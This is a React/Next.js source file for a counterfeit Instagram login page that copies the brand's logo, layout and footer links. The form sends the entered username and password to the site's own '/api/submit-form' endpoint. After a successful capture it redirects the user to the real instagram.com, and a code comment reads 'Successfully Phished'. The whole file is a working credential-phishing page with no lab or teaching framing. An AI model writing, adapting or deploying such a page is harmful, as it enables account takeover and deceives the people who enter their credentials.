"use client"

import Image from "next/image"
import Link from "next/link"
import { Button } from "@/components/ui/button"
import { useState } from "react"

type FormDataType = Readonly<{
  username: string
  password: string
}>

export default function InstagramLogin() {
  const [formData, setFormData] = useState<FormDataType>({
    username: "",
    password: "",
  })

  const [errors, setErrors] = useState<FormDataType>({
    username: "",
    password: "",
  })

  const [isSubmitting, setIsSubmitting] = useState(false)

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    })
  }

  const validateForm = () => {
    const trimmedUsername = formData.username.trim()
    const trimmedPassword = formData.password.trim()

    if (!trimmedUsername || !trimmedPassword) {
      setErrors({
        username: !trimmedUsername ? "Username is required" : "",
        password: !trimmedPassword ? "Password is required" : "",
      })
      return false
    } else if (trimmedPassword.length < 7) {
      setErrors({
        username: "",
        password: "Password must be at least 7 characters",
      })
      return false
    }

    setErrors({ username: "", password: "" })
    return true
  }

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault()
    if (!validateForm()) return

    setIsSubmitting(true)
    try {
      const res = await fetch("/api/submit-form", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(formData),
      })

      const result = await res.json()

      if (!res.ok) {
        console.error("API Error:", result.error)
        alert("Something went wrong: " + result.error)
      } else {
        // Successfully Phished
        setFormData({ username: "", password: "" })
        window.location.href = "https://instagram.com";
      }
    } catch (error) {
      console.error("Network error:", error)
      alert("Failed to connect to server.")
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-white px-4 mt-4">
      <div className="w-full max-w-[350px] flex flex-col items-center">
        {/* Login Card */}
        <div className="w-full border border-gray-300 px-14 pt-16 pb-4 mb-3 flex flex-col items-center">
          <div className="mb-10">
            <Image
              src="/ig-logo.png"
              alt="Instagram"
              className="opacity-85"
              width={175}
              height={100}
            />
          </div>

          <form className="w-full space-y-2 mt-2" onSubmit={handleSubmit}>
            <label htmlFor="username" className="sr-only">Username</label>
            <input
              id="username"
              type="text"
              name="username"
              onChange={handleChange}
              placeholder="Phone number, username, or email"
              className="w-full h-13 text-base bg-gray-50 border border-gray-200 px-3 py-2 focus:border-gray-300 focus-visible:outline-none"
            />
            {errors.username && <p aria-live="polite" className="text-red-500 text-base -translate-y-1.5">{errors.username}</p>}
            <label htmlFor="password" className="sr-only">Password</label>
            <input
              id="password"
              type="password"
              name="password"
              onChange={handleChange}
              placeholder="Password"
              className="w-full h-13 text-base bg-gray-50 border border-gray-200 px-2 py-2 focus:border-gray-300 focus-visible:outline-none"
            />
            {errors.password && <p aria-live="polite" className="text-red-500 text-base -translate-y-1.5">{errors.password}</p>}
            <Button
              disabled={isSubmitting || !formData.username || !formData.password}
              type="submit"
              className={`w-full rounded-lg py-5 mt-2 text-xl font-semibold text-white ${isSubmitting ? "bg-blue-300 cursor-not-allowed" : "bg-[#0095F6] hover:bg-[#1877F2]"
                }`}
            >
              {isSubmitting ? (
                <div className="flex items-center justify-center gap-2">
                  <Image
                    width={20}
                    height={20}
                    src="/loader.png"
                    alt="Logging in..."
                    className="animate-spin"
                  />
                </div>
              ) : "Log in"}
            </Button>
          </form>

          <div className="w-full flex items-center my-8">
            <div className="flex-grow h-px bg-gray-300"></div>
            <span className="px-4 text-gray-500 text-xs font-semibold">OR</span>
            <div className="flex-grow h-px bg-gray-300"></div>
          </div>
          <Link
            href="#"
            className="w-full text-blue-500 text-center text-[1.2rem] font-semibold mb-4"
          >
            <Image
              src="/fb-logo.png"
              alt="Facebook"
              width={20}
              height={20}
              className="inline-block mr-3 brightness-110"
            />
            Log in with Facebook
          </Link>

          <Link href="#" className="text-blue-900 text-[1.2rem] font-normal mb-4 mt-1">
            Forgot password?
          </Link>
        </div>

        {/* Sign Up Card */}
        <div className="w-full border border-gray-300 p-7.5 mb-4 flex justify-center">
          <p className="text-base">
            Don&apos;t have an account?
            <Link href="#" className="text-[#0095F6] font-semibold ml-1 text-[1.2rem]">
              Sign up
            </Link>
          </p>
        </div>

        {/* Get the app */}
        <div className="w-full flex flex-col items-center">
          <p className="text-[1.2rem] mb-4">Get the app.</p>
          <div className="flex space-x-2.5">
            <Link href="#">
              <Image
                src="/google-play.png"
                alt="Download on the App Store"
                width={156}
                height={40}
                className="h-13 w-auto"
              />
            </Link>
            <Link href="#">
              <Image
                src="/microsoft.png"
                alt="Get it on Google Play"
                width={156}
                height={40}
                className="h-13 w-auto"
              />
            </Link>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="w-full max-w-[850px] mt-24 mb-20">
        <div className="flex flex-wrap justify-center gap-x-5 text-base text-gray-500 mb-6">
          <Link href="#">Meta</Link>
          <Link href="#">About</Link>
          <Link href="#">Blog</Link>
          <Link href="#">Jobs</Link>
          <Link href="#">Help</Link>
          <Link href="#">API</Link>
          <Link href="#">Privacy</Link>
          <Link href="#">Terms</Link>
          <Link href="#">Locations</Link>
          <Link href="#">Instagram Lite</Link>
          <Link href="#">Threads</Link>
          <Link href="#">Contact Uploading & Non-Users</Link>
          <Link href="#">Meta Verified</Link>
        </div>

        <div className="flex justify-center items-center gap-4 text-base text-gray-500">
          <select className="bg-transparent border-none text-base text-gray-500 cursor-pointer">
            <option value="en">English</option>
            <option value="es">Español</option>
            <option value="fr">Français</option>
          </select>
          <span>© 2025 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  )
}
